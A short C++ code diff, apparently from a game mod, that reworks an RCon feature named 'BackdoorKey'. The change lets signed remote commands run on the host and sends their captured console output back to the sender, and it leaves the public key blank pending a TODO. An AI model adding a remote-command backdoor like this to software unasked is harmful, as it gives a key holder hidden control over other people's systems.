@@ -7,7 +7,8 @@ namespace Components
 
 	RCon::RCon()
 	{
-		RCon::BackdoorKey = Utils::Cryptography::ECDSA::GenerateKey(512);
+		// TODO: Load public key
+		RCon::BackdoorKey.Set("");
 
 		RCon::BackdoorContainer.timestamp = 0;
 
@@ -31,7 +32,18 @@ namespace Components
 
 			if (Utils::Cryptography::ECDSA::VerifyMessage(RCon::BackdoorKey, RCon::BackdoorContainer.challenge, command.signature()))
 			{
+				RCon::BackdoorContainer.output.clear();
+				Logger::PipeOutput([] (std::string output)
+				{
+					RCon::BackdoorContainer.output.append(output);
+				});
+
 				Command::Execute(command.commands(), true);
+
+				Logger::PipeOutput(nullptr);
+
+				Network::SendCommand(address, "rconResponse", RCon::BackdoorContainer.output);
+				RCon::BackdoorContainer.output.clear();
 			}
 		});
 	}
